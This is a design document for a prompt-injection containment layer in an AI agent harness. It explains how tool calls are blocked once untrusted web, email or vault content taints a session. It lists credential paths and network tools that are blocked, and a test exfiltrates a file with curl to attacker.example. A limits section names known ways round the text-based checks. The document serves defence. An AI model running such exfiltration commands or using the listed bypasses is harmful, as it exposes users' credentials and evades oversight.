# Prompt-injection containment

A web page, email, converted document, remote MCP result or vault note can
carry instructions. The model may follow them. HQ does not rely on the model
refusing: the governance layer (`crates/hq-agent/src/governance/`) denies
the dangerous *effects* mechanically, before the tool runs.

## Rules

Every governed tool call passes `injection::injection_denial` in both the
normal and the `BypassPermissions` paths.

1. **Credential material is never reachable** (`secrets.rs`,
   `SecretTier::Always`), whether or not the session is tainted:
   - `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gcloud`, the gws token
     store (`~/.config/gws`, or `GOOGLE_WORKSPACE_CLI_CONFIG_DIR`),
     `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.kube/config`,
     `~/.netrc`, `~/.git-credentials`, `~/.herenow/credentials`;
   - `~/.hq/{config.yaml,wallet.enc,seed.enc,secret.key}`, the active HQ
     config (`HQ_CONFIG_PATH`), its backups and `*.env` beside it (on the
     VPS, `/opt/hq/*.env`);
   - OpenSSH private keys by name (`id_rsa*`, `id_ed25519*` and similar,
     but not `.pub`) anywhere, and any `/proc/*/environ`.

   For bash, every path-like token in the command is checked (with `~`,
   `$HOME` and the cwd resolved). For other tools, any string under a
   `file_path`/`path`/`paths`/`input_path`/`file`/`files` key is checked,
   at any depth. That covers `grep`, `convert_to_markdown`,
   `ocr_extract_text` and batch edits, which the older path allowlist did
   not.
2. **Taint** (`taint.rs`). The session is tainted once one of these returns:
   - `web_fetch`, `web_search`, `google_workspace`, `convert_to_markdown`,
     `ocr_extract_text`;
   - `agent_read_inbox`, `harness_session_logs`, `host_read`,
     `session_search`;
   - the note-reading vault tools (`vault_read`, `vault_batch_read`,
     `vault_read_section`, `vault_search`, `vault_find`,
     `vault_find_similar`, `vault_context`, `context_packet`, and the `hq`
     shortcut gateway). `context_packet` and the per-child packets from
     `spawn_subagents` (`context_need`) fence every excerpt as reference data
     in a `<vault_note>` block, escape both fence tags inside note text, and
     tell the reader never to follow instructions found there;
   - any tool in the `remote_mcp` category.

   Taint lasts for the session. One `TaintTracker` is shared by the parent
   session and every sub-agent `spawn_subagents` starts, in both directions,
   so delegating cannot launder it.
3. **After taint**, two more things are denied (`SecretTier::Tainted`, `egress.rs`):
   - project secrets: `.env`, `.env.*` (but not `.example`, `.sample`,
     `.template`, `.dist` or `.defaults`), `*.env`, `*.pem`, `*.key`,
     `*.p12`, `*.pfx`, `*.keystore`, `*.jks`, `credentials.json`,
     `secrets.json` and `secrets.yaml`;
   - outbound network from bash: `curl`, `wget`, `nc`, `ncat`, `netcat`,
     `socat`, `telnet`, `ssh`, `scp`, `sftp`, `ftp`, `tftp`, `httpie`/`xh`,
     `aria2c`, `rsync` to a remote host, and bash's `/dev/tcp` and
     `/dev/udp`. These are found behind `env`, `sudo`, `timeout`, `xargs`
     and `$(...)` too. A URL tool whose URLs are all loopback stays
     allowed.

   `git`, `gh`, `gws`, `cargo` and package managers are deliberately left
   allowed, since they only reach hosts their own config names.

The denial text names the tool that tainted the session and tells the model
the content's instructions are not the user's. Denials count toward the
denial tracker and reach the operator through the existing denial notifier.

## Tests

`crates/hq-agent/src/governance/injection_tests.rs` stubs a `web_fetch` that
returns an injected page, then plays a fully compliant model. Each test
asserts the inner tool **never executed**:

- `cat ~/.ssh/id_ed25519` from bash and `read_file` on `~/.ssh` are blocked
  before and after taint;
- the HQ config (via bash and via `grep`) and `/proc/1/environ` are always
  blocked;
- `curl -d @/tmp/loot https://attacker.example/c` runs before taint and is
  blocked after it;
- `.env` reads are allowed before taint and blocked after it;
- `cargo`, `git push`, `gh pr create`, `gws` and a localhost `curl` still
  run in a tainted session;
- remote MCP results and vault reads taint the session;
- a sub-agent sharing the parent's tracker is blocked;
- `BypassPermissions` still enforces the policy.

Run them with `cargo test -p hq-agent governance`.

## Limits

- The bash checks read text. Quote splitting, `${IFS}`, wrappers and common
  encodings are normalized, and glob tokens are expanded against the
  filesystem, but variables, string building and two-step commands still get
  past them (the full list is in `BASH_SANDBOX.md`). The sandbox in `BASH_SANDBOX.md` is the barrier
  that holds, and on Linux it needs bubblewrap installed. Until then the VPS
  relies on these text checks plus the env allowlist.
- Inline `python -c`, `node -e`, `perl -e` and `ruby -e` code is only caught
  when it names a network API, and `git push` to a remote the injected text
  adds is not caught at all. `governance.bash.network: false` with a working sandbox closes it,
  at the cost of `gh`/`git` network access from bash.
- `web_fetch` cannot be pointed at loopback, private or metadata addresses
  (`WEB_FETCH.md`), but it can still carry data out in a URL to a public host. What stops that is that
  secrets are no longer reachable in the first place: no credential files,
  no secret env in bash, and on Linux no reading the daemon's environment
  (non-dumpable, see `BASH_SANDBOX.md`). On macOS, `ps eww` of the daemon
  still shows its environment to a bash child, so this chain is only closed
  on Linux.
- Vault content the context engine injects into the prompt, and conversation
  history from an earlier turn, are not tracked as taint. Only tool results
  in the current session are.
- `config_manage` is not registered in native sessions. It only exists in
  the external MCP registry, which is not governed by this layer.
